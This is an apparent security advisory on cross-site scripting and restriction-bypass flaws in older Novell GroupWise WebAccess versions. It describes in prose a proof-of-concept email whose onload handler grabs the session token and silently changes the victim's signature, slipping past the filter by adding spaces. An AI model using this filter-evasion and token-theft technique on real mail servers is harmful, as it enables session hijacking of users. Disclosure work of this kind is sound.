Novell GroupWise WebAccess is prone to multiple security vulnerabilities.

An attacker may leverage these issues to bypass certain security restrictions or conduct cross-site scripting attacks.

Note that some of the issues may be related to BID 35061. We will update this BID as more information emerges.

Versions prior to WebAccess 7.03 HP3 and 8.0.0 HP2 are vulnerable.

Following harmless code uses an onload() event handler to bootstrap its payload as soon as the email
is open.
The first stage of this script extracts the session token (User.Context) from within the current
document&#039;s URI and used
to make up the second stage.
The second injects an iframe in the current page which in turn calls the signature configuration
interface and changes the user&#039;s signature on the fly.
This example uses a fake target, &#039;gwwa.victim.com&#039; that must be changed with a real server
addresss/name.
Here, the security parser won&#039;t recognize "onload = &#039;javascript:..." as potentially unsafe just
because of the space characters.
